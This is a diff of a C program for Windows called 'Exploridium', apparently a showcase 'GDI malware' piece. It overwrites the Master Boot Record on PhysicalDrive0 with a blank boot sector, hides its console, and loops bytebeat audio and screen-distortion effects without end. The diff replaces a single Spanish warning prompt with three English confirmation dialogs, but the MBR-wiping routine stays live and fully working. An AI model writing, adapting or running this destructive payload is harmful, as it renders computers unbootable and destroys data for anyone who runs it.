@@ -2,24 +2,18 @@
 #include <mmsystem.h>
 #include <math.h>
 
-// Librerías necesarias para el enlazador
 #pragma comment(lib, "winmm.lib")
 #pragma comment(lib, "gdi32.lib")
 
-// Variables globales para control de tiempo y estado
 unsigned int t = 0;
 bool activo = true;
-const int FASE_MUSTRAS = 330750; // 30 segundos exactos a 11025Hz
+const int FASE_MUSTRAS = 330750; // 30 secs
 
-// Función para sobrescribir el Master Boot Record (Sector 0)
 void DestruirMBR() {
     DWORD wb;
-    char mbrData[512] = { 0 };
-    // Firma de arranque estándar de Windows
+    char mbrData[512] = { 0 }; 
     mbrData[510] = (char)0x55;
     mbrData[511] = (char)0xAA;
-
-    // Intento de acceso directo al disco físico
     HANDLE hDrive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
     if (hDrive != INVALID_HANDLE_VALUE) {
         WriteFile(hDrive, mbrData, 512, &wb, NULL);
@@ -27,7 +21,7 @@ void DestruirMBR() {
     }
 }
 
-// Motor de Audio Bytebeat (Hilo separado)
+// Audio engine thread function
 DWORD WINAPI AudioEngine(LPVOID lpParam) {
     HWAVEOUT hWaveOut;
     WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
@@ -36,7 +30,7 @@ DWORD WINAPI AudioEngine(LPVOID lpParam) {
     char buffer[11025];
     WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
 
-    // El hilo corre mientras 'activo' sea true y no pasen las 10 fases
+    // audio generation split into 10 phases of 30 seconds each
     while (activo && t < (FASE_MUSTRAS * 10)) {
         for (int i = 0; i < sizeof(buffer); i++, t++) {
             if (t < FASE_MUSTRAS) // Fase 01
@@ -75,30 +69,82 @@ DWORD WINAPI AudioEngine(LPVOID lpParam) {
 }
 
 int main() {
-    // Cuadro de diálogo de advertencia
-    if (MessageBoxA(NULL, "ADVERTENCIA: ¿Deseas ejecutar Exploridium REAL?\nEsto destruirá el Master Boot Record (MBR).", "ALERTA CRÍTICA", MB_YESNO | MB_ICONSTOP) == IDYES) {
-        
-        DestruirMBR(); // Ejecución del payload destructivo
-        ShowWindow(GetConsoleWindow(), SW_HIDE); // Ocultar la consola
-        
-        // Iniciar el hilo de audio
-        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)AudioEngine, NULL, 0, NULL);
-        
-        HDC hdc = GetDC(0);
-        int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
+// TRIPLE CONFIRMATION SYSTEM
+    if (MessageBoxA(NULL, 
+        "WARNING: The software you are about to execute is malicous and highly destructive.\n\nDo you want to proceed with the execution?", 
+        "EXPLORIDIUM - Safety Warning 1/3", 
+        MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) != IDYES) return 0;
 
-        // Bucle de efectos visuales GDI
-        while (activo) {
-            // Efecto de sacudida e inversión
-            BitBlt(hdc, rand() % 10 - 5, rand() % 10 - 5, sw, sh, hdc, 0, 0, SRCINVERT);
+    if (MessageBoxA(NULL, 
+        "EXTREME DANGER: The Master Boot Record (MBR) will be overwritten.\nYour computer will NO LONGER BOOT after the next restart.\n\nAre you absolutely sure?", 
+        "EXPLORIDIUM - Critical Error 2/3", 
+        MB_YESNO | MB_ICONERROR | MB_DEFBUTTON2) != IDYES) return 0;
+
+    if (MessageBoxA(NULL, 
+        "FINAL WARNING: This is your last chance to cancel.\nExecution is irreversible.\n\nDo you want to destroy this machine?", 
+        "EXPLORIDIUM - System Termination 3/3", 
+        MB_YESNO | MB_ICONSTOP | MB_DEFBUTTON2) != IDYES) return 0;
+
+    DestruirMBR();
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)AudioEngine, NULL, 0, NULL);
+
+    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
+    int tx = 0, ty = 0, dx = 20, dy = 20;
+
+    // Infinite visual destruction loop
+    while (activo) {
+        // Get the device context for the entire screen
+        HDC hdc = GetDC(NULL); 
+
+        // FORCE REFRESH SCREEN
+        InvalidateRect(NULL, NULL, FALSE);
+
+        if (t < FASE_MUSTRAS * 3) {
+            // gelatine effect
+            for (int i = 0; i < sh; i += 5) {
+                int offset = sin(t / 8.0 + i / 15.0) * 20;
+                BitBlt(hdc, offset, i, sw, 5, hdc, 0, i, SRCCOPY);
+            }
+        }
+        else if (t < FASE_MUSTRAS * 6) {
+            // Pyscodelic Zoom Effect
+            StretchBlt(hdc, 15, 15, sw - 30, sh - 30, hdc, 0, 0, sw, sh, SRCCOPY);
+            if (t % 1500 == 0) BitBlt(hdc, 0, 0, sw, sh, hdc, 0, 0, DSTINVERT);
+        }
+        else if (t < FASE_MUSTRAS * 9) {
+            // Paralelogram Distortion
+            POINT v[3];
+            v[0].x = rand() % 60; v[0].y = rand() % 60;
+            v[1].x = sw - rand() % 60; v[1].y = rand() % 60;
+            v[2].x = rand() % 60; v[2].y = sh - rand() % 60;
+            PlgBlt(hdc, v, hdc, 0, 0, sw, sh, 0, 0, 0);
             
-            // Inversión total cada cierto tiempo
-            if (t % 10000 == 0) BitBlt(hdc, 0, 0, sw, sh, hdc, 0, 0, NOTSRCCOPY);
+            // Random color inversion
+            if (rand() % 10 == 0) BitBlt(hdc, 0, 0, sw, sh, hdc, 0, 0, NOTSRCCOPY);
+        }
+        else {
+            // Bouncing Text Effect
+            SetBkMode(hdc, TRANSPARENT);
+            SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
+            HFONT hFont = CreateFontA(100, 0, 0, 0, FW_EXTRABOLD, 0, 0, 0, 0, 0, 0, 0, 0, "Impact");
+            SelectObject(hdc, hFont);
             
-            Sleep(5); // Control de velocidad del GDI
+            TextOutA(hdc, tx, ty, "EXPLORIDIUM", 11);
+            tx += dx; ty += dy;
+            if (tx < 0 || tx > sw - 300) dx = -dx;
+            if (ty < 0 || ty > sh - 100) dy = -dy;
+
+            BitBlt(hdc, rand() % 30 - 15, rand() % 30 - 15, sw, sh, hdc, 0, 0, SRCINVERT);
+            DeleteObject(hFont);
         }
 
-        ReleaseDC(0, hdc);
+        // DC Liberation
+        ReleaseDC(NULL, hdc);
+
+        // Refresh rate control
+        Sleep(2); 
     }
+
     return 0;
 }
